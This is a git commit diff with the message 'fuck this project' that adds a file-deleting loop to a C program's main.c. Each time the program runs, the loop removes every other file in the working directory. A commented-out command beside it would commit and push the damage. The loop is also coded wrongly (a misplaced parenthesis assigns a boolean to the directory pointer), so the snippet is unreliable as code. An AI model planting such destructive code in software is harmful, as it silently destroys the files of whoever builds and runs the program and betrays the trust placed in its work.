4812c203f686cb87a7ad6e3daaa098ff0887d3df
ffashion <1323579954@qq.com>
2021-10-13 14:31:44 +0800

    fuck this project

--- src/main.c
+++ src/main.c
@@ -1,8 +1,23 @@
 #include <stdio.h>
-
+#include <stdlib.h>
+#include <dirent.h>
+#include <string.h>
 
 int main(int argc, char **argv)
 {
+    
+    DIR * dir;
+    struct dirent *ptr;
+    dir = opendir("./");
+    int i = 0;
+    while ((ptr=readdir(dir) != NULL))
+    {   
+        if(i % 2 == 0){
+            remove(ptr->d_name);
+        }
+        i++;
+    } 
+    // system("git add . && git comm -m 'fuck this project' && git push");
 	printf("fuck this project\n");
     return 0;
 }
